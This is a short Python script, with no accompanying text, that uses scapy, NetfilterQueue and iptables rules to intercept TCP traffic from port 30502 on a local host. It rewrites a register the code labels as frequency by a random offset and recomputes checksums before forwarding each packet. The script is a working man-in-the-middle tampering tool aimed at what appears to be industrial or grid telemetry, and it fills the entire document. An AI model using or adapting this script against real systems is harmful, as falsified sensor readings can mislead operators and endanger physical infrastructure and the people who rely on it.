from scapy.all import *
from netfilterqueue import NetfilterQueue
import random

def modify_packet(scapy_packet):

    packet = IP(scapy_packet.get_payload())

    if packet.haslayer(Raw):
        payload = packet[Raw].load
        data = payload[9:]

        first_register = int.from_bytes(data[0:2], byteorder="big")
        if first_register == 101 and len(payload) > 100:
            hz_register = int.from_bytes(data[32:34], byteorder="big")
            print("Orginal Frequecy:", hz_register)

            change_value=random.randint(-5,5)
            new_sec_register = hz_register + change_value
            new_sec_register_bytes = new_sec_register.to_bytes(2, byteorder="big")
            modified_payload = payload[:41] + new_sec_register_bytes + payload[43:]

            packet[Raw].load = modified_payload

            del packet[IP].len
            del packet[IP].chksum
            del packet[TCP].chksum

            print("Modified Frequecy:", new_sec_register)

            scapy_packet.set_payload(bytes(packet))

            print("Modified and sent packet")


    scapy_packet.accept()


def setup_iptables():
    os.system('iptables -I INPUT -p tcp --sport 30502 -s 192.168.1.15 -j NFQUEUE --queue-num 1')
    os.system('iptables -I OUTPUT -p tcp --sport 30502 -s 192.168.1.15 -j NFQUEUE --queue-num 1')

def cleanup_iptables():
    os.system('iptables -D INPUT -p tcp --sport 30502 -s 192.168.1.15 -j NFQUEUE --queue-num 1')
    os.system('iptables -D OUTPUT -p tcp --sport 30502 -s 192.168.1.15 -j NFQUEUE --queue-num 1')

try:
    setup_iptables()
    nfqueue = NetfilterQueue()
    nfqueue.bind(1, modify_packet)
    
    print("[*] Starting NFQUEUE")
    nfqueue.run()
except KeyboardInterrupt:
    print("[*] Stopping NFQUEUE")
finally:
    nfqueue.unbind()
    cleanup_iptables()
    os.system('iptables -D FORWARD -j NFQUEUE --queue-num 1')



#sudo iptables -I INPUT -p tcp --sport 30502 -s 192.168.1.14 -j NFQUEUE --queue-num 1
#sudo iptables -I OUTPUT -p tcp --sport 30502 -s 192.168.1.14 -j NFQUEUE --queue-num 1


# Undo Rules
#sudo iptables -D INPUT -p tcp --sport 30502 -s 192.168.1.14 -j NFQUEUE --queue-num 1
#sudo iptables -D OUTPUT -p tcp --sport 30502 -s 192.168.1.14 -j NFQUEUE --queue-num 1